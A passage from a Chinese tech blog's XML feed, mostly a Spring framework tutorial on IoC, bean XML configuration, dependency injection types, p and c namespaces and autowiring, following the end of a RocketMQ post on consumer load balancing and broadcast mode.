<p>但是如果consumer实例的数量比message queue的总数量还多的话，多出来的consumer实例将无法分到queue，也就无法消费到消息，也就无法起到分摊负载的作用了。所以需要控制让queue的总数量大于等于consumer的数量。</p>
<ul>
<li>广播模式</li>
</ul>
<p>由于广播模式下要求一条消息需要投递到一个消费组下面所有的消费者实例，所以也就没有消息被分摊消费的说法。</p>
<p>在实现上，其中一个不同就是在consumer分配queue的时候，所有consumer都分到所有的queue。</p>
<p><a href="https://i.loli.net/2020/10/02/ikRoAOjCgKW8Pv9.png"><img  
                     lazyload
                     alt="image"
                     data-src="http://jimmyz.top/img/loading.gif"
                      alt="rocket18.png"
                ></a></p>
]]></content>
      <tags>
        <tag>2021</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring</title>
    <url>/2021/03/24/2021/Spring/</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>官网 : <a class="link"   href="http://spring.io/" >http://spring.io/<i class="fas fa-external-link-alt"></i></a></p>
<p>官方下载地址 : <a class="link"   href="https://repo.spring.io/libs-release-local/org/springframework/spring/" >https://repo.spring.io/libs-release-local/org/springframework/spring/<i class="fas fa-external-link-alt"></i></a></p>
<p>GitHub : <a class="link"   href="https://github.com/spring-projects" >https://github.com/spring-projects<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>优点</p>
</blockquote>
<p>1、Spring是一个开源免费的框架 , 容器  .</p>
<p>2、Spring是一个轻量级的框架 , 非侵入式的 .</p>
<p><strong>3、控制反转 IoC  , 面向切面 Aop</strong></p>
<p>4、对事物的支持 , 对框架的支持</p>
<p><strong>Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器（框架）。</strong></p>
<h1 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h1><p><strong>控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法</strong>，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">UserServiceImpl</span> <span class="variable">userService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserServiceImpl</span>();</span><br><span class="line"> 	<span class="comment">//通过set方法注入对应的类 可以方便类修改时service代码不用修改</span></span><br><span class="line">    userService.setUserdao1(<span class="keyword">new</span> <span class="title class_">UserdaoImpl2</span>());</span><br><span class="line">    userService.getUser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>某种意义上是从set方法中开始注入，使得程序解耦合</p>
<hr>
<p><strong>IoC是Spring框架的核心内容</strong>，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IoC。</p>
<p>Spring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从Ioc容器中取出需要的对象。</p>
<p>举个例子：</p>
<p>首先写好xml文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--bean就是java对象 , 由Spring创建和管理--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.liduoan.service.hello&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;liduoan&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意文件中bean的配置</p>
<p>测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//解析beans.xml文件 , 生成管理相应的Bean对象</span></span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//getBean : 参数即为spring配置文件中bean的id .</span></span><br><span class="line">        <span class="type">hello</span> <span class="variable">Hello</span> <span class="operator">=</span> (hello) context.getBean(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        Hello.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由控制文件进行类的创建和变化，使得需求改变的时候，只需要改一下配置文件就可以了</p>
<h2 id="IOC创建对象方式"><a href="#IOC创建对象方式" class="headerlink" title="IOC创建对象方式"></a>IOC创建对象方式</h2><p>通过无参构造方法来创建</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--用的Set注入--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kuangshen&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过有参构造方法来创建</p>
<p>beans.xml 有三种方式编写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 第一种根据index参数下标设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- index指构造方法 , 下标从0开始 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kuangshen2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第二种根据参数名字设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- name指参数名 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kuangshen2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 第三种根据参数类型设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.UserT&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">type</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kuangshen2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Spring配置"><a href="#Spring配置" class="headerlink" title="Spring配置"></a>Spring配置</h2><blockquote>
<p>别名</p>
</blockquote>
<p>alias 设置别名 , 为bean设置别名 , 可以设置多个别名</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--设置别名：在获取Bean的时候可以使用别名获取--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">alias</span> <span class="attr">name</span>=<span class="string">&quot;userT&quot;</span> <span class="attr">alias</span>=<span class="string">&quot;userNew&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Bean的配置</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--bean就是java对象,由Spring创建和管理--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   id 是bean的标识符,要唯一,如果没有配置id,name就是默认标识符</span></span><br><span class="line"><span class="comment">   如果配置id,又配置了name,那么name是别名</span></span><br><span class="line"><span class="comment">   name可以设置多个别名,可以用逗号,分号,空格隔开</span></span><br><span class="line"><span class="comment">   如果不配置id和name,可以根据applicationContext.getBean(.class)获取对象;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">class是bean的全限定名=包名+类名</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hello2 h2,h3;h4&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Hello&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Spring&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>import</p>
</blockquote>
<p>团队的合作通过import来实现 .</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">&quot;&#123;path&#125;/beans.xml&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h1><blockquote>
<p>概念</p>
</blockquote>
<ul>
<li>依赖注入（Dependency Injection,DI）。</li>
<li>依赖 : 指Bean对象的创建依赖于容器 . Bean对象的依赖资源 .</li>
<li>注入 : 指Bean对象所依赖的资源 , 由容器来设置和装配</li>
</ul>
<p>大体分为 构造器注入  Set注入 其他方式注入</p>
<h2 id="Bean注入-【属于Set注入"><a href="#Bean注入-【属于Set注入" class="headerlink" title="Bean注入 【属于Set注入"></a><strong>Bean注入</strong> 【属于Set注入</h2><p>注意点：这里的值是一个引用，ref</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;addr&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Address&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重庆&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小明&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;addr&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、<strong>数组注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;小明&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;addr&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>西游记<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>红楼梦<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>水浒传<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>4、<strong>List注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbys&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>听歌<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>看电影<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>爬山<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>5、<strong>Map注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;中国邮政&quot;</span> <span class="attr">value</span>=<span class="string">&quot;456456456465456&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;建设&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1456682255511&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>6、<strong>set注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>LOL<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>BOB<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>COC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>7、<strong>Null注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">null</span>/&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>8、<strong>Properties注入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;学号&quot;</span>&gt;</span>20190604<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;性别&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;姓名&quot;</span>&gt;</span>小明<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="p命名和c命名注入"><a href="#p命名和c命名注入" class="headerlink" title="p命名和c命名注入"></a>p命名和c命名注入</h2><p>User.java ：【注意：这里没有有参构造器！】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1、P命名空间注入 : 需要在头文件中加入约束文件 【类似Set注入</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">导入约束 : xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--P(属性: properties)命名空间 , 属性依然要设置set方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;狂神&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、c 命名空间注入 : 需要在头文件中加入约束文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">导入约束 : xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</span><br><span class="line"><span class="comment">&lt;!--C(构造: Constructor)命名空间 , 属性依然要设置set方法--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;狂神&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现问题：爆红了，刚才我们没有写有参构造！</p>
<p>解决：把有参构造器加上，这里也能知道，c 就是所谓的构造器注入！</p>
<p>测试代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test02</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="自动装配"><a href="#自动装配" class="headerlink" title="自动装配"></a>自动装配</h1><blockquote>
<p>自动装配说明</p>
</blockquote>
<ul>
<li>自动装配是使用spring满足bean依赖的一种方法</li>
<li>spring会在应用上下文中为某个bean寻找其依赖的bean。</li>
</ul>
<p>Spring中bean有三种装配机制，分别是：</p>
<ol>
<li>在xml中显式配置；</li>
<li>在java中显式配置；</li>
<li>隐式的bean发现机制和自动装配。</li>
</ol>
<p>这里我们主要讲第三种：自动化的装配bean。</p>
<p>Spring的自动装配需要从两个角度来实现，或者说是两个操作：</p>
<ol>
<li>组件扫描(component scanning)：spring会自动发现应用上下文中所创建的bean；</li>
<li>自动装配(autowiring)：spring自动满足bean之间的依赖，也就是我们说的IoC&#x2F;DI；</li>
</ol>
<p>组件扫描和自动装配组合发挥巨大威力，使得显示的配置降低到最少。</p>
<p><strong>推荐不使用自动装配xml配置 , 而使用注解 .</strong></p>
<blockquote>
<p>测试环境搭建</p>
</blockquote>
<p>1、新建一个项目</p>
<p>2、新建两个实体类，Cat  Dog  都有一个叫的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cat</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;miao~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shout</span><span class="params">()</span> &#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;wang~&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3、新建一个用户类 User</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> Cat cat;</span><br><span class="line">   <span class="keyword">private</span> Dog dog;</span><br><span class="line">   <span class="keyword">private</span> String str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>4、编写Spring配置文件</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.kuang.pojo.User&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;cat&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dog&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;str&quot;</span> <span class="attr">value</span>=<span class="string">&quot;qinjiang&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>5、测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMethodAutowire</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> newClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">       <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) context.getBean(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">       user.getCat().shout();</span><br><span class="line">       user.getDog().shout();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果正常输出，环境OK</p>
<h2 id="byName"><a href="#byName" class="headerlink" title="byName"></a>byName</h2><p><strong>autowire byName (按名称自动装配)</strong></p>
<p>由于在手动配置xml过程中，常常发生字母缺漏和大小写等错误，而无法对其进行检查，使得开发效率降低。</p>
<p>采用自动装配将避免这些错误，并且使配置简单化。</p>
<p>测试：</p>
<p>1、修改bean配置，增加一个属性  autowire&#x3D;”byName”</p>
